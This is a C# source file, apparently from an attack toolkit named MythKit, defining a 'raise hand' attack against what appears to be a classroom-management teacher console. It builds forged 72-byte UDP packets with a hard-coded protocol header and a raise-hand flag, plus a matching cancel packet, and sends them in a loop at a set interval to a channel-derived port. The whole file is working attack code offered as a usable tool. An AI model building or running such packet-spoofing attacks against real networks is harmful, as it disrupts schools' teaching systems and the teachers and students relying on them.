using System;
using System.Collections.Generic;
using System.Net;
using System.Windows.Controls;

namespace MythKit.Pages.UDPAttack.AttackFunctions.TeacherAttack
{
    /// <summary>
    /// RaiseHandAttack.xaml 的交互逻辑
    /// </summary>
    public partial class RaiseHandAttack : UserControl, IAttackPattern
    {
        public RaiseHandAttack(string raiseHandIntervalString = "500", string tdChannelString = "1")
        {
            InitializeComponent();
            if (int.TryParse(raiseHandIntervalString, out int raiseHandInterval))
                RaiseHandInterval.Value = raiseHandInterval;
            if (int.TryParse(tdChannelString, out int tdChannel))
                TDChannelID.Value = tdChannel;
        }
        public string AttackName => "（教师端）举手";
        public string AttackId => "raise_hand";
        public AttackTarget Target => AttackTarget.Teacher;
        public AttackPacket ConstructPacket(ref string message, IPAddress ip, int cycleCount, int groupCount)
        {
            byte[] packetRaise = new byte[72]
            {
                    0x41, 0x4e, 0x4e, 0x4f, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Raise Hand (Index 18) */0x10, 0x00, 0xc0, 0xa8, 0x89, 0x81,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            };
            byte[] packetCancel = new byte[72];
            Array.Copy(packetRaise, packetCancel, packetRaise.Length);
            packetCancel[18] = 0x00; // Cancel Hand Raise (Index 18)
            return new AttackPacket(new List<byte[]> { packetRaise, packetCancel }, 5000 + (int)TDChannelID.Value * 512, (int)RaiseHandInterval.Value);
        }
    }
}
